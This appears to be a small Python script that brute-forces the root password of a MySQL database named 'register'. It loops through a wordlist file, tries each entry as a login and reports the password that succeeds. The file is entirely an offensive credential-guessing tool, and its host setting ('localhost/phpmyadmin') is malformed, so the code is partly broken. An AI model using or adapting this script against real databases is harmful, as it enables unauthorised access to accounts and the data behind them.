import mysql.connector as mysql


def mysql_brute(passwd, code = 0):
	try:
		
		con = mysql.connect(host = 'localhost/phpmyadmin', database = 'register', user = 'root', password = passwd)
		if con.is_connected():
			print("Yeah")
		print(passwd)
		code = 1
	except:
		print("Not this one")
		pass
	return code

def crack(q):
	
	try:
		
		print(q)
		for i in q:
			print("Trying " + i)
			c = mysql_brute(i)
			
			if c == 1:
				print("Password found: " + i)
				
				break
				
		
	except:
		pass

f = open("pass.txt", "r")
passes = f.readlines()
print(passes)
f.close()
q = []
for p in passes:
	q.append(p.strip())
crack(q)

